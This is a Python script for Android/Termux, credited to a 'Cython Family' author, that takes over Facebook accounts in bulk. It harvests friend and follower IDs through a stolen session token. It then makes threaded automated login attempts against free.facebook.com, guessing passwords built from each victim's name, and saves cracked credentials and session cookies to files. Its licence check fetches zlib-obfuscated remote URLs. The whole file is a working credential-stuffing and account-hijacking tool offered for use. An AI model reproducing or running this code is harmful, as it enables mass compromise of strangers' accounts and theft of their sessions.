#!/usr/bin/python3
# -*- coding: utf-8 -*-
#c++¥€
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,calendar
from time import time as tod
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as Chigozieworldwide
from platform import platform
current_GMT = time.gmtime()
import base64
import zlib
import subprocess
# INDICATION
rr = random.randint; rc = random.choice
id=[]
id2=[]
loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
taplikasi=[]
tokenku=[]
uid=[]
lisensikuni=[]
cokbrut=[]
pwpluss=[]
pwnya=[]
princp=[]
uaku=[]
oppoBrowser=[]
Chrome=[]
HTC=[]
ChromeBrowser=[]
chromebrowser=[]
vivoBrowser=[]
chromium=[]
oppo =[]
uCBrowser=[]
huaweiBrowser=[]
pwlist=[]
try:os.mkdir('/sdcard/Ok.txt/')
except:pass
ses=requests.Session()
C='\033[0m' #CLEAR
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = "\033[1;30m" # Hitam
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'



def cocok():
    try:
        cokbru=open('.cookie.txt').read()
        cokbrut.append(cokbru)
    except:
        login_lagi334()
def clear():
        os.system('clear')
#BANNER
def banner():
        clear()
        print("""%s
                   
, ＜￣｀ヽ、　　　　　　／￣＞
　ゝ、　　＼　／⌒ヽ,ノ 　/´
　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
　　 　　>　 　 　,)
　　　　　∠_,,,/ 

                             CODE BY CHIGOZIEWORLDWIDE 
                             Telegram : CythonFamily
                             Github   : https://t.me/CHIG0ZIEWORLDWIDE
                             Team   : Cython-Family
                             Version  : 5.0
 ╔╦══• •✠•❀ XCARET ❀•✠ • •══╦╗
 ╚╩══• •✠•❀ XCARET ❀•✠ • •══╩╝
 
---------------------------------------------------------------------
 🎀  Don't Minimize When Clonning
---------------------------------------------------------------------

"""%(P))



def Main_():
        cocok()
        chi_main()
        try:
            token = open('.token.txt','r').read()
            tokenku.append(token)
            try:
                sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                menu(sy2,sy3)
            except KeyError:
                login_lagi334()
            except requests.exceptions.ConnectionError:
                banner()
                print('[+] NO INTERNET CONNECTION')
                print(70*'-')
                exit()
        except IOError:
            login_lagi334()
    
def login_lagi334():
    banner()
    pil='1'
    if pil in ['1','01']:
        try:
            print('[+] LOGIN USING COOKIES ')
            print(70*'-')
            cooki=input("[+] INPUT COOKIES ")
            open('.cookie.txt','w').write(cooki)
            head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
            data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
            find_token = re.search("(EAAG\w+)", data.text)
            ken=open(".token.txt", "w").write(find_token.group(1))
            cokrom=open('.cookie.txt','r').read()
            tokrom=open('.token.txt','r').read()
            tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
            tes3 = json.loads(tes.text)['id']
            print(70*'-')
            print('[+] LOGIN SUCCESSFULLY')
            print(70*'-')
            exit()
        except Exception as e: 
            os.system("rm -rf .token.txt")
            os.system("rm -rf .cookie.txt")
            print('[+] COOKIES EXPIRED ')
            print(70*'-')
            exit()

def menu(my_name,my_id):
        banner()
        print(70*'-')
        print('%s[%s+%s] %sSTATUS %s: %sPREMIUM'%(P,P,P,P,P,H))
        print('%s[+] USER   : %s'%(P,my_name.upper()))
        print('%s[+] UID    : %s'%(P,my_id))
        print(f"[+] DATE   : {tgl} {bln} {thn}")
        print(70*'-')
        print('%s[%s01%s] %sPUBLIC CLONE'%(P,P,P,P));time.sleep(0.01)
        print('%s[%s02%s] %sCLONE MULTIPLE'%(P,P,P,P));time.sleep(0.01)
        print('%s[%s03%s] %sFOLLOWERS CLONE'%(P,P,P,P));time.sleep(0.01)
        print('%s[%s00%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
        jh = input(P+'['+P+'++'+P+'] MENU  ')
        if jh in ['1','01']:
                dump_publik()
        elif jh in ['2','02']:
                mixdump()
        elif jh in ['3','03']:
                dump_pengikut()
        elif jh in ['0','00']:
                os.system("rm -rf .cookie.txt")
                os.system("rm -rf .token.txt")
                print(P+'['+P+'+'+P+'] PROCESSING ')
                time.sleep(1)
                print('[+] EXIT SUCCESSFULLY')
                exit()
        else:
                print('[+] RETURN BACK TO MENU')
                exit()

        
def mixdump():
    print(70*'-')
    print('[01] MULTIPLE CLONE')
    print(70*'-')
    pilih=input('[+] CHOOSE ')
    print(70*'-')
    if pilih in ['','']:
        nmfil=input('[+] INPUT FILENAME  ')
        nmfile=open(nmfil,'r').read().splitlines()
        for xfil in nmfile:
            uid.append(xfil)
    elif pilih in ['1','01']:
        print(P+'['+P+'+'+P+'] MAXIMUM ID [20]')
        try:
            jum = int(input(P+'['+P+'+'+P+'] LIMITS '))
        except ValueError:
            print('[+] NOT FOUND')
            print(70*'-')
            exit()
        if jum<1 or jum>20:
            print('[+] OUT OF RANGE')
            print(70*'-')
            exit()
        yz = 0
        print(70*'-')
        print(P+'['+P+'+'+P+'] PROCESSING')
        print(70*'-')
        for met in range(jum):
            yz+=1
            kl = input(P+'['+P+str(yz)+P+'] INPUT '+str(yz)+'ID ')
            uid.append(kl)
    print('[+] PROCESSING')
    print(70*'-')
    with Chigozieworldwide(max_workers=30) as dumk:
        for userr in uid:
            dumk.submit(dumpdump,userr)
    setting()
        
def dump_pengikut():
    try:
        chi_main()
        token = open('.token.txt','r').read()
    except IOError:
        exit()
    print('[+] DUMP FROM FOLLOWERS')
    print(70*'-')
    print(P+'['+P+'P'+P+'] PROCESSING')
    pil = input(P+'['+P+'P'+P+'] INPUT TARGET ID  ')
    try:
        koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
        for pi in koh2['subscribers']['data']:
            try:id.append(pi['id']+'|'+pi['name'])
            except:continue
        print(P+'['+P+'+'+P+'] TOTAL IDS  '+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('[+] NO INTERNET CONNECTION')
        print(70*'-')
        exit()
    except (KeyError,IOError):
        print('[+] FAILED TOKEN')
        print(70*'-')
        exit()

def multidump():
        try:
                cok= open('.cok.txt','r').read()
        except IOError:
                exit()
        try:
                print(70*'-')
                nanya_keun = int(input('%s[%s+%s] ENTER LIMIT %s:%s '%(P,P,P,P,P)))
        except:nanya_keun=1000000
        for mnh in range(nanya_keun):
                mnh +=1
                print()
                pil = input('[%s+%s] ENTER PUBLIC ID %s%s%s : '%(P,P,P,mnh,P))
                try:
                        koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
                        for pi in koh2['friends']['data']:
                                try:id.append(pi['id']+'|'+pi['name'])
                                except:continue
                except requests.exceptions.ConnectionError:
                        print('[×] BAD INTERNET CONNECTION! ')
                except (KeyError,IOError):
                        print('\n [×] ERROR RETRIEVING ID, PROBABLY ID IS NOT FOUND');multidump()
        print()
        print(P+'['+P+'+'+P+'] TOTAL : '+str(len(id)))
        setting()
 

def dumpdump(pil):
    try:
        chi_main()
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
        for pi in koh2['friends']['data']:
                iso=pi['id']+'|'+pi['name']
                if iso in id:pass
                else:
                    id.append(iso)
                    sys.stdout.write(f'\r[+] TOTAL ID {len(id)}');sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        dumpdump(pil)
    except (KeyError,IOError):
        pass
                 
# PUBLIC CRACK
def dump_publik():
    try:
        chi_main()
        token = open('.token.txt','r').read()
    except IOError:
        exit()
    print(70*'-')
    print('[++] CLONE PUBLIC IDS')
    print(70*'-')
    print('[+] PROCESSING')
    pil = input('[+] INPUT ID  ')
    dumpdump(pil)
    print(' = TOTAL : '+str(len(id)))
    setting()

def setting():
    print(70*'-')
    print('%s[%s01%s] %sFAST API [Recommended]'%(P,P,P,P));time.sleep(0.01)
    print('%s[%s02%s] %sSLOW API%s'%(P,P,P,P,P));time.sleep(0.01)
    print(70*'-')
    hu = input(P+'['+P+'+'+P+'] CHOOSE ')
    if hu in ['1','01']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['2','02']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print('[+] OPTION NOT IN THE MENU ')
        exit()
        
    print(70*'-')    
    print('[+] INPUT METHOD ')
    print(70*'-')
    print('[01] META BASIC RECOMMENDED ')
    print('[02] META FREE ')
    print('[03] META MOBILE ')
    print(70*'-')
    hc = input(P+'['+P+'+'+P+']  ')
    if hc in ['1','01']:
        method.append('free')
    elif hc in ['4','04']:
        method.append('web')
    else:
        method.append('free')
        
    print(70*'-')           
    print('[+] EXTERNAL PASSWORD ')
    print(70*'-')
    print('[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345\n[3] FirstName123,FullName12345,FullName123456')
    print(70*'-')
    pwlis=input(P+'['+P+'+'+P+'] CHOOSE ')
    pwlist.append(pwlis)
    passwrd()
def passwrd():
    banner()
    print(70*'-')
    print(f"[+] DATE  :  {tgl} {bln} {thn}")
    print(70*'-')
    print("\033[1;97m[+] TOTAL IDS = \033[92;1m"+str(len(id)))
    print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
    print("\033[1;97m[+] PROCESSING\x1b[0m")
    print(70*'-')
    with Chigozieworldwide(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                localz=yuzong.split('|')[2]
            except:
                localz=random.choice(['en_US','en_GB'])
            if '1' in pwlist:
                pwv=[frs+'123',nmf]
            elif'2' in pwlist:
                pwv=[nmf,frs+'123',frs+'12345',frs+'12']
            elif'3' in pwlist:
                pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
            elif'4' in pwlist:
                pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
            else:
                pwv=[nmf]
            if 'ya' in pwpluss:
                for ccf in pwnya:
                    pwv.append(ccf)
            else:pass
            
            if 'free' in method:
                pool.submit(crackfree,idf,pwv,nmf,localz)
            else:
                pool.submit(crackfree,idf,pwv,nmf,localz)
    print('')
    print(70*'-')
    print('[+] PROCESS COMPLETED')
    print(70*'-')
    exit()
    
def ran():
    return str(tod()).split('.')[0]
    
def crackfree(idf,pwv,nmf,localz):
    global loop,ok,cp
    sys.stdout.write(f"\r [{H}{loop}{P}-{M}{len(id2)}{Z}] {Z}[{H}{ok}{B}-{K}{cp}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(len(id2)))}{Z}]  "),
    sys.stdout.flush()
    ses = requests.Session()
    ua = random.choice(["Mozilla/5.0 (Linux; Android 4.2.2; HTC One X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.2.2; en-; HTC One X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; Android 4.2.2; HTC One X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36"])
    for pw in pwv:
        try:
            p = ses.get(f"https://free.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-from-malicious-account-compromise-apps%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=en_US&_rdr")
            dataa = {
			"m_ts": re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),
			"li": re.search('name="li" value="(.*?)"', str(p.text)).group(1),
			"try_number": re.search('name="try_number" value="(.*?)"', str(p.text)).group(1),
			"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(p.text)).group(1),
			"email": idf,
			"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(p.text)).group(1),
			"encpass": "#PWD_BROWSER:0:{}:{}".format(ran(),pw),
			"jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"_fb_noscript": re.search('name="_fb_noscript" value="(.*?)"', str(p.text)).group(1),
            }
            ses.cookies.update({"locale": localz})
            headerrr = {
			"Host": "free.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"user-agent": ua,
			"content-type": "application/x-www-form-urlencoded",
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"origin": "https://m.facebook.com",
			"x-requested-with": "com.microsoft.bing",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": "https://free.facebook.com/login.php",
			"accept-encoding": "gzip, deflate",
			"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
			}
            po = ses.post(f"https://free.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=18bced55339b9e9b250fe8f14c638840&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-from-malicious-account-compromise-apps%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100",data=dataa,headers=headerrr,allow_redirects=False)
            if "checkpoint" in ses.cookies.get_dict().keys():
                print(f'\r\033[1;31m [CP] {idf} | {pw}')
                open('/sdcard/CHIGOZIECP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r {H}[CHIGOZIE-OK] {idf} | {pw} \n [==]{B} Cookies == {H}{kuki}{N}')
                open('/sdcard/CHIGOZIEOK/'+cpc,'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(5)
    loop+=1
 
def Line():
	clear()
	banner()
	print("\033[1;97m[+] LICENSE KEY NOT APPROVED")
	print('\r[+] PREMIUM STATUS\n')
	h1=os.getuid()
	h2=os.getlogin()
	id = "-".join(h2)
	basex=(f"{h1}-{h2}")
	print(70*'-')
	print("\033[1;97m[+] YOUR KEY : \033[0;92m%s"%(id))
	try:
		xn = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd7\x0f\x08u\xf2\xf1t644\xd4OM\xc9,\x01\x00\xba\xd9\n\xc6')
		TIME = requests.get(xn).text
		if id in TIME:
			print("\033[1;97m[+] LICENSED KEY APPROVED SUCCESSFULLY")
			msg=os.getuid()
			#time.sleep(1)
			pass
		else:
			print("\x1b[1;97m[+] SEND YOUR KEY TO AUTHOR")  
			print("\x1b[1;97m[+] FUCK YOUR BYPASSED SYSTEM")
			print(70*'-')
			os.system('am start https://wa.me/+2348069472717?text=Hi+CHIGOZIEWORLDWIDR+i+Want+to+pay+for+IG+linces:+'+id+'>/dev/null')
			time.sleep(0)
			sys.exit()
	except:
		sys.exit()
#	if __main__=='__name__':
#		Line()

Line()

def line():
	h1=os.getuid()
	h2=os.getlogin()
	basex=(f"{h1}-{h2}")
	basex1 = basex.encode('ascii')
	basex2 = base64.b64encode(basex1)
	basex3 = basex2.decode('ascii')
	base4 = (basex3).upper()
	nr = base4.replace('=', '0').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
	banner()
	print(70*'-')
	print("\033[1;97m[+] FUCK YOUR BYPASS SYSTEM ")
	print(70*'-') 
	print("\033[1;97m[+] NOT A REGISTERED USER ")
	print("\033[1;97m[+] REGISTER PREMIUM KEY FROM AUTHOR ")
	print(70*'-')
	print("\033[1;97m[+] YOUR KEY : \033[0;92m%s"%(nr))
	print("\033[1;97m[+] SEND THIS KEY TO AUTHOR \n")    
	print(70*'-')
	subprocess.check_output(["am", "start", "https://t.me/CythonFamily"])
	exit()


def chi_main():
	try:
		open("/sdcard/.txt",'w').write("cp")
		open("/sdcard/Android/media/.cn",'w').write("xb6\xd2\xd7")
		open("/sdcard/.cp.txt",'w').write("304098")
		os.remove("/sdcard/.txt")
	except(PermissionError):
		os.system("termux-setup-storage")
		exit()
	h1=os.getuid()
	h2=os.getlogin()
	basex=(f"{h1}-{h2}")
	try:
		zl = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd7\x0f\xf2\x8ft\xf4142\xd6OM\xc9,\x01\x00\xb0\xf2\n\x91')
		rq = requests.get(zl).text
	except requests.exceptions.ConnectionError:
		print('%s\nBAD INTERNET CONNECTION\n'%(P))
		exit()
	basex1 = basex.encode('ascii')
	basex2 = base64.b64encode(basex1)
	basex3 = basex2.decode('ascii')
	base4 = (basex3).upper()
	nr = base4.replace('=', '0').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
	rn = nr.encode('ascii')
	rn1 = base64.b64encode(rn)
	rn2 = rn1.decode('ascii')
	rn3 = (rn2).upper()
	if rn3 in rq:
		pass
	else:
		line()
def chigozie():
	try:
		zl = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd7ws\np\r\xf2\xf5\x0c\x0e\xf6\xf4\xf7\x03\x00\xa7!\n0')
		r =requests.get(zl).text
		if "Yes" in r:
			Main_()
		else:
			print("\n%s[+] THE CYTHON FAMILY TOOLS IS OFF RIGHT NOW"%(P))
			exit()
	except requests.exceptions.ConnectionError:
		print('%s\nBAD INTERNET CONNECTION \n'%(P))
		exit()


if __name__=='__main__':
    try:os.mkdir('/sdcard/CHIGOZIEOK')
    except:pass
    try:os.mkdir('/sdcard/CHIGOZIECP')
    except:pass
    chigozie()